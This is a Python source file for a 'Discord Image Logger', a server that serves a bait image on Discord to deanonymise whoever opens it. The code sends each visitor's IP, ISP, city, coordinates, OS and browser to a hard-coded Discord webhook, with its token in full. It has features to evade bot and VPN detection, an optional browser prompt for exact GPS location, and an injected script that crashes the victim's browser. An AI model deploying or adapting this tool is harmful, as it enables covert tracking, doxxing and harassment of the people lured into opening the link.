# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1125210696641159198/N7AT9WpuPVm08RapJpvEJx3kt3JwNPOhnZBWmvMMjrdE93o8M3jFaOWy8aOnEFfXv0N1",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
